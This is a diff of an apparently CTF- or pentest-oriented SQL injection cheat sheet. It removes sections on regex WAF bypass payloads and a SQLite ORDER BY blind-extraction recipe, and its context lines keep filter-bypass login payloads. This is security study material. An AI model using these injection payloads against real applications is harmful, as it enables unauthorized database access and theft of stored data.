@@ -92,23 +92,6 @@ WHWHEREERE     → removes WHERE  → WHERE
 
 **Key:** Read the source code first to determine the exact blocklist (which keywords, case-sensitive or not, processing order). The nesting pattern depends on which substring is removed — if both `OR` and `or` are blocked sequentially, use `OorR` (inner `or` removed first, leaving `OR` which was already processed).
 
-### Regex WAF Bypass (whitespace-anchored keyword matches)
-When a regex WAF blocks `union\s+select` (the most common pattern), parenthesizing the SELECT defeats it while staying valid SQL:
-```sql
--- Regex `union\s+select` requires whitespace between the two keywords:
-union(select 1,2,3)              -- no whitespace; matches `union(`, not `union <ws>select`
-union(select(group_concat(table_name)) from information_schema.tables)
-union all(select 1,2,3)          -- ALL keyword between also bypasses
-union/**/select 1,2,3            -- comment as delimiter (covered above too)
-
--- Independent rule on the SAME WAF: `\bnull\b` blocked
--- Substitute placeholders with values that pass the column-type check:
-union(select 0,0,0)              -- numeric placeholder
-union(select '','','')           -- string placeholder
-union(select (0),(0),(0))        -- parenthesized
-```
-**Test EACH WAF rule independently** before assuming SQLi is non-exploitable. WAFs commonly stack multiple regex rules: blocking `union select` AND `null` AND `information_schema` are three separate rules and each has a different bypass. Trip one rule per request, look at the error, then build the full payload from the bypasses that worked.
-
 ### Blind SQLi Filter Bypass (Regex-Filtered Keywords)
 When the app uses `preg_match` or regex to block specific keywords (and, or, where, limit, like, substring, substr, etc.) and spaces:
 ```sql
@@ -131,35 +114,6 @@ admin"/**/&&/**/1=1#                    -- double-quote injection
 ```
 
 **Key:** Always check quote context (single vs double) by reading source code. MySQL uses `"` for string literals when `ANSI_QUOTES` is not set. Use `#` for MySQL comments (no trailing space needed, unlike `-- `).
-
-### SQLite Blind SQLi via `ORDER BY ${var}` — full extraction without UNION/stacked
-
-When source review finds raw template-literal interpolation into `ORDER BY` (e.g. Node.js `db.run(\`... ORDER BY ${col}\`)`), SQLite accepts arbitrary expressions in the sort key — including subqueries — so you get a per-request oracle that flips **row order** rather than overall truthiness.
-
-**Sink to look for during source review:**
-```js
-const q = `SELECT id, name, votes FROM emojis ORDER BY ${order}`;
-// TOOD: add parametrization  ← classic giveaway comment
-```
-
-**Oracle construction (the trap):** swapping between two columns whose values barely differ (e.g. `id` vs `name`) gives an unreliable signal. Choose **two columns with disparate value distributions** — `votes` vs `-votes` (or `count` vs `-count`) — so the predicate picks which side a known top row lands on:
-
-```sql
--- Boolean oracle: predicate flips between ascending and descending sort
-CASE WHEN (<predicate>) THEN votes ELSE -votes END
-
--- Wrap a sqlite_master probe to leak schema/data:
-CASE WHEN (SELECT substr(sql,N,1) FROM sqlite_master WHERE name='users')=char(C) THEN votes ELSE -votes END
-```
-
-Compare the **first row of the response** between the two states; that one bit drives a binary search per character.
-
-**Extraction recipe:**
-1. Schema discovery via `sqlite_master`: count rows, then leak `name` and `sql` per row.
-2. Per target column, binary-search each character: `unicode(substr(...,N,1)) < C` (32..126).
-3. Bound iteration with `length()` before reading characters.
-
-**Why this is not brute force:** every probe is a deterministic boolean over DB state — a logical oracle, not a wordlist guess. ~7-10 requests per character via binary search.
 
 ### SQLite load_extension() RCE (Django SQL Explorer / BI Tools)
 When a SQL-explorer-style admin UI hands your query to SQLite with `enable_load_extension=True`:
